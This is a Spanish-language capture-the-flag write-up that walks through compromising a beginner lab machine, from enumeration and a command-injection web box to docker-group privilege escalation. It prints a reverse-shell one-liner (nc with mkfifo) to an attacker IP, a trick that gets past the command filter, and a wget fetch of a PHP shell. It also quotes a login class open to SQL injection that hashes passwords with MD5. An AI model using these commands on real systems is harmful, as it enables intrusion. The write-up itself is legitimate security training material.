---
layout: apunte
title: "2. Getting the Flags"
---

<h2>Reconocimiento Inicial</h2>
Comenzaremos escaneando los puertos abiertos de la máquina.

!**Pasted image 20260322174202.png**

Ahora vamos a escanear dichos puertos más a fondo.

!**Pasted image 20260322174257.png**

De aquí sacamos que podemos conectarnos por FTP mediante anonymous login. Vamos a ver qué directorios hay en el servidor web.

!**Pasted image 20260322174652.png**
!**Pasted image 20260322174708.png**
!**Pasted image 20260322174724.png**

Habiendo encontrado esto, vamos a ver cómo se ve la página web.

!**Pasted image 20260322174816.png**

Mirando el código fuente de esta página vemos que parece haberla creado un tal `Vipul Mirajkar`, puede que sea parte del CTF o la realidad del framework que se haya utilizado, nos lo guardamos. Vamos ahora a ver qué hay en los directorios.

!**Pasted image 20260322175153.png**

Una caja de texto que parece diseñada para ejecutar comandos, peligroso. Vamos a ver más directorios.

!**Pasted image 20260322175436.png**

Parece que si el tamaño del comando es muy grande no nos deja ejecutarlo.

------------------------------
<h2>Profundización</h2>
Vamos a ir primero con la caja de texto. Al meter el comando `whoami` nos devuelve el resultado.

!**Pasted image 20260322175303.png**

Con esto seguramente podamos conseguir una reverse shell. Vamos a ver qué hay en FTP.

!**Pasted image 20260322175600.png**

Parece que hay algunos filtros sobre los comandos introducidos en la caja de texto.

-------------------------------
<h2>Explotación</h2>
Hemos visto que había una página `contact.php` por lo que podemos aprovecharnos de esto para intuir que se está utilizando PHP en el backend. Vamos a intentar subir una reverse shell.

!**Pasted image 20260322175832.png**

Primero creamos la shell y la servimos. Ahora nos ponemos en escucha por el puerto introducido en la reverse shell.

!**Pasted image 20260322175904.png**

Ahora descargamos la shell en la máquina víctima con `wget http://IP:PUERTO_PYTHON/ruta/archivo`.

!**Pasted image 20260322180109.png**

Funciona, ahora lo ejecutamos con `php chillhack.php`.

!**Pasted image 20260322180142.png**

Nos lo han denegado, parece que el comando `php` está filtrado. Vamos a intentar otra forma. Como `php` está filtrado probamos con otras variantes. `PHP` funciona, pero no carga la shell. Vamos a probar con `/`: `ph/p chillhack.php`. Tampoco funcionó.

Vamos a probar con una reverse shell de `nc`: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.128.67 4444 >/tmp/f`. Esto nos salta el mismo aviso, por lo que vamos a probar variantes otra vez. El comando: `r/m /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.128.67 4444 >/tmp/f` funcionó, no detecta las `/`.

!**Pasted image 20260322180937.png**

Parece que no nos deja leer los documentos de los usuarios, tendremos que hacer un pivotaje.

!**Pasted image 20260322181134.png**

Parece que hay un archivo que todo el mundo puede ejecutar con `sudo` sin contraseña:

!**Pasted image 20260322181227.png**

Vamos a leerlo.

!**Pasted image 20260322181336.png**

Este script lo que hace es que le pide a un usuario que introduzca su nombre y lo guarda en una variable, pero ejecuta dicho mensaje y no muestra los errores. El problema de esto es que no filtra el mensaje, por lo que se pueden ejecutar comandos arbitrarios. Vamos a estabilizar la shell.

!**Pasted image 20260322182040.png**

No hemos podido ejecutarlo, pero lo tendremos en cuenta para más adelante. Siguiendo con la investigación, vemos que hay algunos archivos que merece la pena ver:

!**Pasted image 20260322182251.png**

Vamos a ver qué contienen los archivos `account.php` y `hacker.php`.

- `account.php`:

```php
<?php

class Account
{
        public function __construct($con)
        {
                $this->con = $con;
        }
        public function login($un,$pw)
        {
                $pw = hash("md5",$pw);
                $query = $this->con->prepare("SELECT * FROM users WHERE username='$un' AND password='$pw'");
                $query->execute();
                if($query->rowCount() >= 1)
                {
                        return true;
                }?>
                <h1 style="color:red";>Invalid username or password</h1>
        <?php }
}

?>
```

Es una clase que recibe una conexión de base de datos y permite el login. Se puede ver que el algoritmo usado es MD5.

- `hacker.php`:

```html
<html>
<head>
<body>
<style>
body {
  background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
}
h2
{
        color:red;
        font-weight: bold;
}
h1
{
        color: yellow;
        font-weight: bold;
}
</style>
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
</head>
</html>
```

Vamos a ver qué son las imágenes.

!**Pasted image 20260322182721.png**

Servimos las imágenes y vamos a verlas.

!**Pasted image 20260322182942.png**

Con `steghide` encontramos un zip en una imagen. Vamos a ver qué contiene.

!**Pasted image 20260322183022.png**

Parece que tiene una contraseña, vamos a intentar crackearla.

!**Pasted image 20260322183127.png**

Extraemos la contraseña, ahora la usamos para descomprimir el archivo.

!**Pasted image 20260322183255.png**

Con esto hemos encontrado la contraseña del usuario `anurodh`. Vamos a intentar entrar por SSH.

!**Pasted image 20260322183417.png**

El usuario `anurodh` forma parte del grupo docker, esto puede servirnos más adelante.

!**Pasted image 20260322184710.png**

Parece que no podemos ejecutar el script como `root`, pero sí como `apaar`.

!**Pasted image 20260322183709.png**

Vamos a abrir una shell con `apaar`.

!**Pasted image 20260322183745.png**

De esta manera conseguimos acceso como `apaar` y podemos leer la primera flag.

!**Pasted image 20260322183830.png**

-----------------------------
<h2>Escalada de Privilegios</h2>
Estabilizamos la shell de nuevo.

!**Pasted image 20260322183945.png**

Ahora vamos a intentar escalar privilegios a root. Lo primero que probaré será la ejecución del mismo script pero como sudo. 

!**Pasted image 20260322184106.png**

Necesito la contraseña y no la tengo, por lo que empezaré con mi checklist habitual de escalada de privilegios.

Después de un rato probando, no he encontrado nada, pero entonces me he acordado de que el usuario `anurodh` era parte del grupo docker, puede que eso nos sirva.

!**Pasted image 20260322184852.png**

Efectivamente así ha sido. Vamos a leer la flag de root.

!**Pasted image 20260322184954.png**

----------------------------------
<h2>Conclusión</h2>
Máquina súper divertida, sencilla pero completa, tocando:

- Enumeración
- Varios protocolos
- Webshell
- Movimiento lateral
- Escalada de privilegios

Me ha gustado mucho, y además se adapta al nivel de principiante.

>[!SUCCESS] Ambas flags encontradas, let's goo!

